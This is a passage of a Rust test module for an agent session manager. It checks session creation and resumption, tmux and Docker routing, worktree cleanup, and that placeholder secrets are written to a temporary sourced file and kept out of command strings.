            .await
            .unwrap();
        mgr.store()
            .set_secret_with_env("GH_WORK", "ghp_abc", Some("GITHUB_TOKEN"))
            .await
            .unwrap();

        let mut req = make_req("secret-test");
        req.secrets = Some(vec!["MY_TOKEN".into(), "GH_WORK".into()]);
        let session = mgr.create_session(req).await.unwrap();
        assert_eq!(session.status, SessionStatus::Active);

        let calls = backend.calls.lock().unwrap();
        let create_call = &calls[0];
        // Secrets should NOT appear in the command string (security fix)
        assert!(
            !create_call.contains("secret123"),
            "secret value leaked into command: {create_call}"
        );
        assert!(
            !create_call.contains("ghp_abc"),
            "secret value leaked into command: {create_call}"
        );
        // Instead, the command should source a secrets file from data_dir
        assert!(
            create_call.contains("/secrets/secrets-"),
            "command should source secrets file: {create_call}"
        );
        assert!(
            create_call.contains("&& rm -f"),
            "command should delete secrets file: {create_call}"
        );
        drop(calls);

        // Verify the secrets file was created with correct content in data_dir
        let data_dir = mgr.store().data_dir();
        let secrets_path = format!("{data_dir}/secrets/secrets-{}.sh", session.id);
        let content = std::fs::read_to_string(&secrets_path).unwrap();
        assert!(content.contains("export MY_TOKEN='secret123'"));
        assert!(content.contains("export GITHUB_TOKEN='ghp_abc'"));
    }

    #[tokio::test]
    async fn test_create_session_with_empty_secrets() {
        let (mgr, _, _pool) = test_manager(MockBackend::new()).await;
        let mut req = make_req("empty-secrets");
        req.secrets = Some(vec![]);
        let session = mgr.create_session(req).await.unwrap();
        assert_eq!(session.status, SessionStatus::Active);
    }

    #[tokio::test]
    async fn test_create_session_emits_event() {
        let (mgr, _, _pool) = test_manager(MockBackend::new()).await;
        let (event_tx, mut event_rx) = broadcast::channel(16);
        let mgr = mgr.with_event_tx(event_tx, "test-node".into());
        let _session = mgr.create_session(make_req("event-test")).await.unwrap();

        let event = event_rx.recv().await.unwrap();
        let se = unwrap_session_event(event);
        assert_eq!(se.session_name, "event-test");
        assert_eq!(se.status, "active");
        assert_eq!(se.previous_status.as_deref(), Some("creating"));
        assert_eq!(se.node_name, "test-node");
    }

    #[tokio::test]
    async fn test_stop_session_emits_event() {
        let (mgr, _, _pool) = test_manager(MockBackend::new()).await;
        let (event_tx, mut event_rx) = broadcast::channel(16);
        let mgr = mgr.with_event_tx(event_tx, "test-node".into());
        let session = mgr.create_session(make_req("stop-event")).await.unwrap();
        // Drain the create event
        let _ = event_rx.recv().await;

        mgr.stop_session(&session.id.to_string(), false)
            .await
            .unwrap();
        let event = event_rx.recv().await.unwrap();
        let se = unwrap_session_event(event);
        assert_eq!(se.status, "stopped");
    }

    #[tokio::test]
    async fn test_stop_session_purge_active_succeeds() {
        let (mgr, _, _pool) = test_manager(MockBackend::new()).await;
        let session = mgr.create_session(make_req("test")).await.unwrap();
        let id = session.id.to_string();

        // stop_session with purge handles active sessions fine — stops then purges
        mgr.stop_session(&id, true).await.unwrap();
        let fetched = mgr.get_session(&id).await.unwrap();
        assert!(fetched.is_none());
    }

    #[tokio::test]
    async fn test_stop_session_purge_not_found() {
        let (mgr, _, _pool) = test_manager(MockBackend::new()).await;
        let result = mgr.stop_session("nonexistent", true).await;
        assert!(result.is_err());
        assert!(result.unwrap_err().to_string().contains("not found"));
    }

    #[tokio::test]
    async fn test_resolve_backend_id_with_stored() {
        let (mgr, _, _pool) = test_manager(MockBackend::new()).await;
        let session = mgr.create_session(make_req("test")).await.unwrap();
        let backend_id = mgr.resolve_backend_id(&session);
        // MockBackend.query_backend_id returns $N where N is name length
        assert_eq!(backend_id, "$4");
    }

    #[tokio::test]
    async fn test_resolve_ink_no_command_no_ink_falls_back_to_shell() {
        let (mgr, _, _pool) = test_manager(MockBackend::new()).await;
        let req = CreateSessionRequest {
            name: "test".into(),
            workdir: Some("/tmp".into()),
            command: None,
            ink: None,
            description: Some("desc".into()),
            metadata: None,
            idle_threshold_secs: None,
            worktree: None,
            worktree_base: None,
            runtime: None,
            secrets: None,
        };
        let resolved = mgr.resolve_ink(&req).unwrap();
        // Falls back to $SHELL or /bin/sh
        assert!(!resolved.command.is_empty());
        assert_eq!(resolved.description, Some("desc".into()));
    }

    #[tokio::test]
    async fn test_ink_description_fallback() {
        let mut inks = HashMap::new();
        inks.insert(
            "test-ink".into(),
            InkConfig {
                description: Some("Ink desc".into()),
                command: Some("echo test".into()),
                ..InkConfig::default()
            },
        );
        let tmpdir = tempfile::tempdir().unwrap();
        let tmpdir = Box::leak(Box::new(tmpdir));
        let store = Store::new(tmpdir.path().to_str().unwrap()).await.unwrap();
        store.migrate().await.unwrap();
        let backend = Arc::new(MockBackend::new());
        let mgr = SessionManager::new(backend, store, inks, None).with_no_stale_grace();

        let req = CreateSessionRequest {
            name: "fallback-test".into(),
            workdir: Some("/tmp".into()),
            command: None,
            ink: Some("test-ink".into()),
            description: None, // Should fall back to ink description
            metadata: None,
            idle_threshold_secs: None,
            worktree: None,
            worktree_base: None,
            runtime: None,
            secrets: None,
        };
        let session = mgr.create_session(req).await.unwrap();
        assert_eq!(session.description, Some("Ink desc".into()));
    }

    #[tokio::test]
    async fn test_ink_with_no_command_falls_back_to_shell() {
        let mut inks = HashMap::new();
        inks.insert(
            "empty-ink".into(),
            InkConfig {
                description: Some("Empty".into()),
                command: None,
                ..InkConfig::default()
            },
        );
        let tmpdir = tempfile::tempdir().unwrap();
        let tmpdir = Box::leak(Box::new(tmpdir));
        let store = Store::new(tmpdir.path().to_str().unwrap()).await.unwrap();
        store.migrate().await.unwrap();
        let backend = Arc::new(MockBackend::new());
        let mgr = SessionManager::new(backend, store, inks, None).with_no_stale_grace();

        let req = CreateSessionRequest {
            name: "empty-test".into(),
            workdir: Some("/tmp".into()),
            command: None,
            ink: Some("empty-ink".into()),
            description: None,
            metadata: None,
            idle_threshold_secs: None,
            worktree: None,
            worktree_base: None,
            runtime: None,
            secrets: None,
        };
        // Ink with no command falls back to $SHELL
        let session = mgr.create_session(req).await.unwrap();
        assert!(!session.command.is_empty());
    }

    #[tokio::test]
    async fn test_create_session_uses_default_command() {
        let tmpdir = tempfile::tempdir().unwrap();
        let tmpdir = Box::leak(Box::new(tmpdir));
        let store = Store::new(tmpdir.path().to_str().unwrap()).await.unwrap();
        store.migrate().await.unwrap();
        let backend = Arc::new(MockBackend::new());
        let mgr = SessionManager::new(backend, store, HashMap::new(), Some("claude".into()))
            .with_no_stale_grace();

        let req = CreateSessionRequest {
            name: "default-cmd-test".into(),
            workdir: Some("/tmp".into()),
            command: None,
            ink: None,
            description: None,
            metadata: None,
            idle_threshold_secs: None,
            worktree: None,
            worktree_base: None,
            runtime: None,
            secrets: None,
        };
        let session = mgr.create_session(req).await.unwrap();
        assert_eq!(session.command, "claude");
    }

    #[tokio::test]
    async fn test_create_session_explicit_command_overrides_default() {
        let tmpdir = tempfile::tempdir().unwrap();
        let tmpdir = Box::leak(Box::new(tmpdir));
        let store = Store::new(tmpdir.path().to_str().unwrap()).await.unwrap();
        store.migrate().await.unwrap();
        let backend = Arc::new(MockBackend::new());
        let mgr = SessionManager::new(backend, store, HashMap::new(), Some("claude".into()))
            .with_no_stale_grace();

        let req = CreateSessionRequest {
            name: "explicit-cmd-test".into(),
            workdir: Some("/tmp".into()),
            command: Some("custom-agent".into()),
            ink: None,
            description: None,
            metadata: None,
            idle_threshold_secs: None,
            worktree: None,
            worktree_base: None,
            runtime: None,
            secrets: None,
        };
        let session = mgr.create_session(req).await.unwrap();
        assert_eq!(session.command, "custom-agent");
    }

    #[tokio::test]
    async fn test_create_session_ink_overrides_default_command() {
        let mut inks = HashMap::new();
        inks.insert(
            "coder".into(),
            InkConfig {
                description: Some("Coder ink".into()),
                command: Some("claude -p 'implement'".into()),
                ..InkConfig::default()
            },
        );
        let tmpdir = tempfile::tempdir().unwrap();
        let tmpdir = Box::leak(Box::new(tmpdir));
        let store = Store::new(tmpdir.path().to_str().unwrap()).await.unwrap();
        store.migrate().await.unwrap();
        let backend = Arc::new(MockBackend::new());
        let mgr = SessionManager::new(backend, store, inks, Some("default-agent".into()))
            .with_no_stale_grace();

        let req = CreateSessionRequest {
            name: "ink-over-default".into(),
            workdir: Some("/tmp".into()),
            command: None,
            ink: Some("coder".into()),
            description: None,
            metadata: None,
            idle_threshold_secs: None,
            worktree: None,
            worktree_base: None,
            runtime: None,
            secrets: None,
        };
        let session = mgr.create_session(req).await.unwrap();
        assert_eq!(session.command, "claude -p 'implement'");
    }

    #[tokio::test]
    async fn test_ink_provides_runtime() {
        let mut inks = HashMap::new();
        inks.insert(
            "sandbox-coder".into(),
            InkConfig {
                description: Some("Docker coder".into()),
                command: Some("claude".into()),
                runtime: Some("docker".into()),
                ..InkConfig::default()
            },
        );
        let docker = Arc::new(MockBackend::new());
        let tmpdir = tempfile::tempdir().unwrap();
        let tmpdir = Box::leak(Box::new(tmpdir));
        let store = Store::new(tmpdir.path().to_str().unwrap()).await.unwrap();
        store.migrate().await.unwrap();
        let mgr = SessionManager::new(Arc::new(MockBackend::new()), store, inks, None)
            .with_docker_backend(docker)
            .with_no_stale_grace();

        let req = CreateSessionRequest {
            name: "ink-rt".into(),
            workdir: Some("/tmp".into()),
            command: None,
            ink: Some("sandbox-coder".into()),
            description: None,
            metadata: None,
            idle_threshold_secs: None,
            worktree: None,
            worktree_base: None,
            runtime: None, // Not set — should inherit from ink
            secrets: None,
        };
        let session = mgr.create_session(req).await.unwrap();
        assert_eq!(session.runtime, Runtime::Docker);
    }

    #[tokio::test]
    async fn test_ink_runtime_overridden_by_request() {
        let mut inks = HashMap::new();
        inks.insert(
            "docker-ink".into(),
            InkConfig {
                command: Some("claude".into()),
                runtime: Some("docker".into()),
                ..InkConfig::default()
            },
        );
        let tmpdir = tempfile::tempdir().unwrap();
        let tmpdir = Box::leak(Box::new(tmpdir));
        let store = Store::new(tmpdir.path().to_str().unwrap()).await.unwrap();
        store.migrate().await.unwrap();
        let mgr = SessionManager::new(Arc::new(MockBackend::new()), store, inks, None)
            .with_no_stale_grace();

        let req = CreateSessionRequest {
            name: "override-rt".into(),
            workdir: Some("/tmp".into()),
            command: None,
            ink: Some("docker-ink".into()),
            description: None,
            metadata: None,
            idle_threshold_secs: None,
            worktree: None,
            worktree_base: None,
            runtime: Some(Runtime::Tmux), // Override ink's docker runtime
            secrets: None,
        };
        let session = mgr.create_session(req).await.unwrap();
        assert_eq!(session.runtime, Runtime::Tmux);
    }

    #[tokio::test]
    async fn test_ink_secrets_merged_with_request_secrets() {
        let mut inks = HashMap::new();
        inks.insert(
            "coder-with-secrets".into(),
            InkConfig {
                command: Some("claude".into()),
                secrets: vec!["INK_SECRET".into()],
                ..InkConfig::default()
            },
        );
        let tmpdir = tempfile::tempdir().unwrap();
        let tmpdir = Box::leak(Box::new(tmpdir));
        let store = Store::new(tmpdir.path().to_str().unwrap()).await.unwrap();
        store.migrate().await.unwrap();
        // Set up the secrets in the store
        store.set_secret("INK_SECRET", "ink-value").await.unwrap();
        store.set_secret("REQ_SECRET", "req-value").await.unwrap();
        let backend = Arc::new(MockBackend::new());
        let mgr = SessionManager::new(backend.clone(), store, inks, None).with_no_stale_grace();

        let req = CreateSessionRequest {
            name: "merged-secrets".into(),
            workdir: Some("/tmp".into()),
            command: None,
            ink: Some("coder-with-secrets".into()),
            description: None,
            metadata: None,
            idle_threshold_secs: None,
            worktree: None,
            worktree_base: None,
            runtime: None,
            secrets: Some(vec!["REQ_SECRET".into()]),
        };
        let session = mgr.create_session(req).await.unwrap();
        // Secret values should NOT appear in the command string (security fix)
        let calls: Vec<_> = backend.calls.lock().unwrap().clone();
        let create_call = calls.iter().find(|c| c.starts_with("create:")).unwrap();
        assert!(
            !create_call.contains("ink-value"),
            "ink secret value leaked into command: {create_call}"
        );
        assert!(
            !create_call.contains("req-value"),
            "request secret value leaked into command: {create_call}"
        );
        // Instead, the command should source a secrets file
        assert!(
            create_call.contains("/secrets/secrets-"),
            "command should source secrets file: {create_call}"
        );

        // Verify the secrets file contains both secrets
        let data_dir = mgr.store().data_dir();
        let secrets_path = format!("{data_dir}/secrets/secrets-{}.sh", session.id);
        let content = std::fs::read_to_string(&secrets_path).unwrap();
        assert!(
            content.contains("INK_SECRET"),
            "ink secret should be in file: {content}"
        );
        assert!(
            content.contains("REQ_SECRET"),
            "request secret should be in file: {content}"
        );
    }

    #[test]
    fn test_write_secrets_file_path_includes_session_id() {
        let tmpdir = tempfile::tempdir().unwrap();
        let data_dir = tmpdir.path().to_str().unwrap();
        let id = uuid::Uuid::new_v4();
        let mut secrets = HashMap::new();
        secrets.insert("KEY".to_owned(), "val".to_owned());
        let path = write_secrets_file(&id, &secrets, data_dir)
            .unwrap()
            .unwrap();
        assert!(
            path.contains(&id.to_string()),
            "path should contain session ID: {path}"
        );
        assert_eq!(path, format!("{data_dir}/secrets/secrets-{id}.sh"));
    }

    #[test]
    fn test_write_secrets_file_content_format() {
        let tmpdir = tempfile::tempdir().unwrap();
        let data_dir = tmpdir.path().to_str().unwrap();
        let id = uuid::Uuid::new_v4();
        let mut secrets = HashMap::new();
        secrets.insert("MY_VAR".to_owned(), "hello world".to_owned());
        let path = write_secrets_file(&id, &secrets, data_dir)
            .unwrap()
            .unwrap();
        let content = std::fs::read_to_string(&path).unwrap();
        // Each line should be: export KEY='VALUE'
        assert!(content.contains("export MY_VAR='hello world'\n"));
    }

    #[test]
    fn test_write_secrets_file_escapes_multiple_single_quotes() {
        let tmpdir = tempfile::tempdir().unwrap();
        let data_dir = tmpdir.path().to_str().unwrap();
        let id = uuid::Uuid::new_v4();
        let mut secrets = HashMap::new();
        secrets.insert("K".to_owned(), "a'b'c".to_owned());
        let path = write_secrets_file(&id, &secrets, data_dir)
            .unwrap()
            .unwrap();
        let content = std::fs::read_to_string(&path).unwrap();
        // Each ' becomes '\'' in shell single-quote escaping
        assert!(content.contains("export K='a'\\''b'\\''c'"));
    }

    #[test]
    fn test_wrap_command_secrets_source_before_env_vars() {
        let id = uuid::Uuid::new_v4();
        let cmd = wrap_command("echo test", &id, "sess", Some("/tmp/secrets.sh"));
        // The source-and-delete must come BEFORE the env var exports
        let source_pos = cmd.find(". /tmp/secrets.sh").unwrap();
        let env_pos = cmd.find("PULPO_SESSION_ID").unwrap();
        assert!(
            source_pos < env_pos,
            "secrets should be sourced before env vars: {cmd}"
        );
    }

    #[test]
    fn test_wrap_command_secrets_source_and_delete_pattern() {
        let id = uuid::Uuid::new_v4();
        let path = "/tmp/pulpo-secrets-test.sh";
        let cmd = wrap_command("my-agent", &id, "sess", Some(path));
        // Pattern: `. <file> && rm -f <file>; `
        assert!(cmd.contains(&format!(". {path} && rm -f {path}; ")));
    }

    #[tokio::test]
    async fn test_create_session_with_missing_secret_names() {
        // Requesting secrets that don't exist in store — should silently skip them
        let (mgr, _, _pool) = test_manager(MockBackend::new()).await;
        let mut req = make_req("missing-secrets");
        req.secrets = Some(vec!["NONEXISTENT_SECRET".into()]);
        let session = mgr.create_session(req).await.unwrap();
        assert_eq!(session.status, SessionStatus::Active);
    }

    #[tokio::test]
    async fn test_create_session_secret_env_collision() {
        let (mgr, _, _pool) = test_manager(MockBackend::new()).await;
        // Set up two secrets that both map to GITHUB_TOKEN
        mgr.store()
            .set_secret("GITHUB_TOKEN", "val1")
            .await
            .unwrap();
        mgr.store()
            .set_secret_with_env("GH_WORK", "val2", Some("GITHUB_TOKEN"))
            .await
            .unwrap();

        let mut req = make_req("collision-test");
        req.secrets = Some(vec!["GITHUB_TOKEN".into(), "GH_WORK".into()]);
        let result = mgr.create_session(req).await;
        let err = result.unwrap_err().to_string();
        assert!(err.contains("both map to env var"), "got: {err}");
    }

    #[tokio::test]
    async fn test_create_session_no_command_no_default_falls_back_to_shell() {
        let (mgr, backend, _pool) = test_manager(MockBackend::new()).await;
        let req = CreateSessionRequest {
            name: "no-fallback".into(),
            workdir: Some("/tmp".into()),
            command: None,
            ink: None,
            description: None,
            metadata: None,
            idle_threshold_secs: None,
            worktree: None,
            worktree_base: None,
            runtime: None,
            secrets: None,
        };
        let session = mgr.create_session(req).await.unwrap();
        // Should fall back to $SHELL or /bin/sh
        assert!(!session.command.is_empty());
        let calls = backend.calls.lock().unwrap();
        assert!(calls[0].contains("-l -c"));
        drop(calls);
    }

    #[tokio::test]
    async fn test_resume_lost_sessions_resumes_active_with_dead_backend() {
        let (mgr, backend, _pool) = test_manager(MockBackend::new()).await;
        // Create a session (backend is alive)
        mgr.create_session(make_req("sess-a")).await.unwrap();

        // Now simulate reboot: backend reports dead
        *backend.alive.lock().unwrap() = false;

        // Build a new manager that uses the same store but with dead backend
        let resumed = mgr.resume_lost_sessions().await.unwrap();
        assert_eq!(resumed, 1);

        // Backend should have received a create call for the resumed session
        // 2 create calls: one from original create_session, one from resume
        let resume_creates = backend
            .calls
            .lock()
            .unwrap()
            .iter()
            .filter(|c| c.starts_with("create:"))
            .count();
        assert_eq!(resume_creates, 2);
    }

    #[tokio::test]
    async fn test_resume_lost_sessions_skips_stopped_sessions() {
        let (mgr, backend, _pool) = test_manager(MockBackend::new()).await;
        mgr.create_session(make_req("stopped-sess")).await.unwrap();
        mgr.stop_session("stopped-sess", false).await.unwrap();

        *backend.alive.lock().unwrap() = false;
        let resumed = mgr.resume_lost_sessions().await.unwrap();
        assert_eq!(resumed, 0);
    }

    #[tokio::test]
    async fn test_resume_lost_sessions_skips_alive_sessions() {
        let (mgr, _, _pool) = test_manager(MockBackend::new()).await;
        mgr.create_session(make_req("alive-sess")).await.unwrap();

        // Backend is alive — should not resume
        let resumed = mgr.resume_lost_sessions().await.unwrap();
        assert_eq!(resumed, 0);
    }

    #[tokio::test]
    async fn test_resume_lost_sessions_resumes_idle_sessions() {
        let (mgr, backend, _pool) = test_manager(MockBackend::new()).await;
        let session = mgr.create_session(make_req("idle-sess")).await.unwrap();

        // Manually set to Idle (simulates watchdog marking it idle before reboot)
        mgr.store()
            .update_session_status(&session.id.to_string(), SessionStatus::Idle)
            .await
            .unwrap();

        *backend.alive.lock().unwrap() = false;
        let resumed = mgr.resume_lost_sessions().await.unwrap();
        assert_eq!(resumed, 1);

        // Simulate the resumed session being alive now
        *backend.alive.lock().unwrap() = true;

        // Session should be Active again
        let fetched = mgr
            .get_session(&session.id.to_string())
            .await
            .unwrap()
            .unwrap();
        assert_eq!(fetched.status, SessionStatus::Active);
    }

    #[tokio::test]
    async fn test_resume_lost_sessions_marks_lost_on_backend_failure() {
        let (mgr, _, _pool) =
            test_manager(MockBackend::new().with_alive(false).with_create_error()).await;
        // Force-insert a session that looks active but backend will fail on resume
        let session = Session {
            id: Uuid::new_v4(),
            name: "fail-resume".into(),
            workdir: "/tmp".into(),
            command: "echo hello".into(),
            description: None,
            status: SessionStatus::Active,
            exit_code: None,
            backend_session_id: Some("fail-resume".into()),
            output_snapshot: None,
            metadata: None,
            ink: None,
            intervention_code: None,
            intervention_reason: None,
            intervention_at: None,
            last_output_at: None,
            idle_since: None,
            idle_threshold_secs: None,
            worktree_path: None,
            worktree_branch: None,
            git_branch: None,
            git_commit: None,
            git_files_changed: None,
            git_insertions: None,
            git_deletions: None,
            git_ahead: None,
            runtime: Runtime::Tmux,
            created_at: Utc::now() - chrono::Duration::hours(1),
            updated_at: Utc::now(),
        };
        mgr.store().insert_session(&session).await.unwrap();

        let resumed = mgr.resume_lost_sessions().await.unwrap();
        assert_eq!(resumed, 0);

        // Session should be marked Lost (not Active)
        let fetched = mgr
            .get_session(&session.id.to_string())
            .await
            .unwrap()
            .unwrap();
        assert_eq!(fetched.status, SessionStatus::Lost);
    }

    #[tokio::test]
    async fn test_resume_lost_sessions_returns_zero_when_empty() {
        let (mgr, _, _pool) = test_manager(MockBackend::new()).await;
        let resumed = mgr.resume_lost_sessions().await.unwrap();
        assert_eq!(resumed, 0);
    }

    #[tokio::test]
    async fn test_create_session_invalid_workdir() {
        let (mgr, _, _pool) = test_manager(MockBackend::new()).await;
        let req = CreateSessionRequest {
            name: "bad-dir".to_owned(),
            workdir: Some("/nonexistent/path/that/does/not/exist".into()),
            command: Some("echo hi".into()),
            ink: None,
            description: None,
            metadata: None,
            idle_threshold_secs: None,
            worktree: None,
            worktree_base: None,
            runtime: None,
            secrets: None,
        };
        let err = mgr.create_session(req).await.unwrap_err();
        assert!(
            err.to_string().contains("working directory does not exist"),
            "{err}"
        );
    }

    #[tokio::test]
    async fn test_create_session_docker_skips_workdir_check() {
        let docker = Arc::new(MockBackend::new());
        let tmpdir = tempfile::tempdir().unwrap();
        let tmpdir = Box::leak(Box::new(tmpdir));
        let store = Store::new(tmpdir.path().to_str().unwrap()).await.unwrap();
        store.migrate().await.unwrap();
        let mgr = SessionManager::new(Arc::new(MockBackend::new()), store, HashMap::new(), None)
            .with_docker_backend(docker)
            .with_no_stale_grace();
        // Docker session with nonexistent workdir should succeed (workdir is inside container)
        let req = CreateSessionRequest {
            name: "docker-bad-dir".to_owned(),
            workdir: Some("/nonexistent/container/path".into()),
            command: Some("echo hi".into()),
            ink: None,
            description: None,
            metadata: None,
            idle_threshold_secs: None,
            worktree: None,
            worktree_base: None,
            runtime: Some(Runtime::Docker),
            secrets: None,
        };
        let session = mgr.create_session(req).await.unwrap();
        assert_eq!(session.runtime, Runtime::Docker);
    }

    #[tokio::test]
    async fn test_resume_session_invalid_workdir() {
        let (mgr, _, pool) = test_manager(MockBackend::new().with_alive(false)).await;
        let session = mgr
            .create_session(make_req("resume-bad-dir"))
            .await
            .unwrap();
        let id = session.id.to_string();
        // Mark as lost and set workdir to nonexistent path
        sqlx::query("UPDATE sessions SET status = 'lost', workdir = ? WHERE id = ?")
            .bind("/nonexistent/path/that/does/not/exist")
            .bind(&id)
            .execute(&pool)
            .await
            .unwrap();
        let err = mgr.resume_session(&id).await.unwrap_err();
        assert!(
            err.to_string().contains("working directory does not exist"),
            "{err}"
        );
    }

    #[tokio::test]
    async fn test_with_docker_backend_routes_docker_sessions() {
        let docker = Arc::new(MockBackend::new());
        let tmpdir = tempfile::tempdir().unwrap();
        let tmpdir = Box::leak(Box::new(tmpdir));
        let store = Store::new(tmpdir.path().to_str().unwrap()).await.unwrap();
        store.migrate().await.unwrap();
        let main_backend = Arc::new(MockBackend::new());
        let mgr = SessionManager::new(main_backend.clone(), store, HashMap::new(), None)
            .with_docker_backend(docker.clone())
            .with_no_stale_grace();
        // Create a docker session
        let req = CreateSessionRequest {
            name: "docker-test".to_owned(),
            workdir: Some("/tmp".into()),
            command: Some("echo hi".into()),
            ink: None,
            description: None,
            metadata: None,
            idle_threshold_secs: None,
            worktree: None,
            worktree_base: None,
            runtime: Some(Runtime::Docker),
            secrets: None,
        };
        let session = mgr.create_session(req).await.unwrap();
        assert_eq!(session.runtime, Runtime::Docker);
        assert!(
            session
                .backend_session_id
                .as_deref()
                .unwrap()
                .starts_with("docker:")
        );
        // Docker backend should have received the create call, not the main backend
        let docker_calls: Vec<_> = docker.calls.lock().unwrap().clone();
        assert!(
            docker_calls.iter().any(|c| c.starts_with("create:")),
            "docker backend should handle docker sessions"
        );
        let main_calls: Vec<_> = main_backend.calls.lock().unwrap().clone();
        assert!(
            !main_calls.iter().any(|c| c.starts_with("create:")),
            "main backend should not handle docker sessions"
        );
    }

    #[tokio::test]
    async fn test_docker_no_config_fails() {
        // No docker backend configured
        let (mgr, _, _pool) = test_manager(MockBackend::new()).await;
        let req = CreateSessionRequest {
            name: "docker-test".to_owned(),
            workdir: Some("/tmp".into()),
            command: Some("echo hi".into()),
            ink: None,
            description: None,
            metadata: None,
            idle_threshold_secs: None,
            worktree: None,
            worktree_base: None,
            runtime: Some(Runtime::Docker),
            secrets: None,
        };
        let err = mgr.create_session(req).await.unwrap_err();
        assert!(
            err.to_string().contains("docker runtime not configured"),
            "{err}"
        );
    }

    #[tokio::test]
    async fn test_docker_command_not_wrapped() {
        let docker = Arc::new(MockBackend::new());
        let tmpdir = tempfile::tempdir().unwrap();
        let tmpdir = Box::leak(Box::new(tmpdir));
        let store = Store::new(tmpdir.path().to_str().unwrap()).await.unwrap();
        store.migrate().await.unwrap();
        let mgr = SessionManager::new(Arc::new(MockBackend::new()), store, HashMap::new(), None)
            .with_docker_backend(docker.clone())
            .with_no_stale_grace();
        let req = CreateSessionRequest {
            name: "docker-cmd".to_owned(),
            workdir: Some("/tmp".into()),
            command: Some("claude".into()),
            ink: None,
            description: None,
            metadata: None,
            idle_threshold_secs: None,
            worktree: None,
            worktree_base: None,
            runtime: Some(Runtime::Docker),
            secrets: None,
        };
        mgr.create_session(req).await.unwrap();
        // Docker command should NOT be wrapped with bash -l -c
        let calls: Vec<_> = docker.calls.lock().unwrap().clone();
        let create_call = calls.iter().find(|c| c.starts_with("create:")).unwrap();
        assert!(
            !create_call.contains("-l -c"),
            "docker command should not be wrapped: {create_call}"
        );
        assert!(
            create_call.contains("claude"),
            "docker command should be raw: {create_call}"
        );
    }

    #[tokio::test]
    async fn test_stale_grace_period_prevents_early_marking() {
        // Use default stale_grace_secs (5) — don't use with_no_stale_grace
        let tmpdir = tempfile::tempdir().unwrap();
        let tmpdir = Box::leak(Box::new(tmpdir));
        let store = Store::new(tmpdir.path().to_str().unwrap()).await.unwrap();
        store.migrate().await.unwrap();
        let backend = Arc::new(MockBackend::new().with_alive(false));
        let mgr = SessionManager::new(backend, store, HashMap::new(), None);

        let session = mgr.create_session(make_req("young")).await.unwrap();
        // Session was just created — within grace period, so check_and_mark_stale returns false
        let fetched = mgr
            .get_session(&session.id.to_string())
            .await
            .unwrap()
            .unwrap();
        // Status should remain Active despite backend being dead (grace period)
        assert_eq!(fetched.status, SessionStatus::Active);
    }

    #[test]
    fn test_cleanup_worktree_nonexistent_path() {
        // Should not panic on nonexistent path
        cleanup_worktree("/tmp/nonexistent-worktree-path-for-test", "/tmp");
    }

    #[test]
    fn test_cleanup_worktree_existing_path() {
        // Create a temporary directory structure simulating ~/.pulpo/worktrees/session
        let tmpdir = tempfile::tempdir().unwrap();
        let wt_path = tmpdir
            .path()
            .join(".pulpo")
            .join("worktrees")
            .join("test-session");
        std::fs::create_dir_all(&wt_path).unwrap();
        let wt_str = wt_path.to_str().unwrap();
        assert!(wt_path.exists());
        // repo_dir doesn't need to be a real git repo for this test — prune is best-effort
        cleanup_worktree(wt_str, "/tmp");
        // The worktree directory should be removed
        assert!(!wt_path.exists());
    }

    #[tokio::test]
    async fn test_stop_session_with_worktree() {
        let (mgr, _, pool) = test_manager(MockBackend::new()).await;
        let session = mgr.create_session(make_req("wt-stop")).await.unwrap();
        let id = session.id.to_string();
        // Simulate a session with a worktree path (nonexistent — cleanup is best-effort)
        sqlx::query("UPDATE sessions SET worktree_path = ? WHERE id = ?")
            .bind("/tmp/nonexistent-wt-stop-test")
            .bind(&id)
            .execute(&pool)
            .await
            .unwrap();
        // Stop should succeed even with a worktree path
        mgr.stop_session(&id, false).await.unwrap();
    }

    #[tokio::test]
    async fn test_stop_session_purge_with_worktree() {
        let (mgr, _, pool) = test_manager(MockBackend::new()).await;
        let session = mgr.create_session(make_req("wt-purge")).await.unwrap();
        let id = session.id.to_string();
        // Simulate a session with a worktree path (nonexistent — cleanup is best-effort)
        sqlx::query("UPDATE sessions SET worktree_path = ? WHERE id = ?")
            .bind("/tmp/nonexistent-wt-purge-test")
            .bind(&id)
            .execute(&pool)
            .await
            .unwrap();
        // Stop with purge should stop, clean up worktree, and delete from DB
        mgr.stop_session(&id, true).await.unwrap();
        let fetched = mgr.get_session(&id).await.unwrap();
        assert!(fetched.is_none());
    }

    #[tokio::test]
    async fn test_resume_lost_sessions_docker_command_not_wrapped() {
        let docker = Arc::new(MockBackend::new().with_alive(false));
        let tmpdir = tempfile::tempdir().unwrap();
        let tmpdir = Box::leak(Box::new(tmpdir));
        let store = Store::new(tmpdir.path().to_str().unwrap()).await.unwrap();
        store.migrate().await.unwrap();
        let pool = store.pool().clone();
        let mgr = SessionManager::new(
            Arc::new(MockBackend::new().with_alive(false)),
            store,
            HashMap::new(),
            None,
        )
        .with_docker_backend(docker.clone())
        .with_no_stale_grace();

        // Create a docker session and mark it active with dead backend
        let req = CreateSessionRequest {
            name: "auto-resume-docker".to_owned(),
            workdir: Some("/tmp".into()),
            command: Some("echo hi".into()),
            ink: None,
            description: None,
            metadata: None,
            idle_threshold_secs: None,
            worktree: None,
            worktree_base: None,
            runtime: Some(Runtime::Docker),
            secrets: None,
        };
        let session = mgr.create_session(req).await.unwrap();
        // Mark it active (create_session left it as Active) — backend is dead
        docker.calls.lock().unwrap().clear();

        let resumed = mgr.resume_lost_sessions().await.unwrap();
        assert_eq!(resumed, 1);
        // Docker auto-resume should NOT wrap the command
        let calls: Vec<_> = docker.calls.lock().unwrap().clone();
        let create_call = calls.iter().find(|c| c.starts_with("create:"));
        assert!(
            create_call.is_some(),
            "docker backend should re-create session"
        );
        assert!(
            !create_call.unwrap().contains("bash -l -c"),
            "auto-resumed docker command should not be wrapped"
        );
        // Verify the session ID was stored correctly
        let updated = sqlx::query_as::<_, (String,)>("SELECT status FROM sessions WHERE id = ?")
            .bind(session.id.to_string())
            .fetch_one(&pool)
            .await
            .unwrap();
        assert_eq!(updated.0, "active");
    }

    // -- wrap_command edge cases --

    #[test]
    fn test_wrap_command_double_quotes() {
        let id = uuid::Uuid::new_v4();
        let cmd = wrap_command("echo \"hello world\"", &id, "test", None);
        assert!(cmd.contains("echo \"hello world\""));
        assert!(cmd.contains("-l -c"));
    }

    #[test]
    fn test_wrap_command_backticks() {
        let id = uuid::Uuid::new_v4();
        let cmd = wrap_command("echo `date`", &id, "test", None);
        assert!(cmd.contains("echo `date`"));
    }

    #[test]
    fn test_wrap_command_dollar_variables() {
        let id = uuid::Uuid::new_v4();
        let cmd = wrap_command("echo $HOME $USER", &id, "test", None);
        assert!(cmd.contains("echo $HOME $USER"));
    }

    #[test]
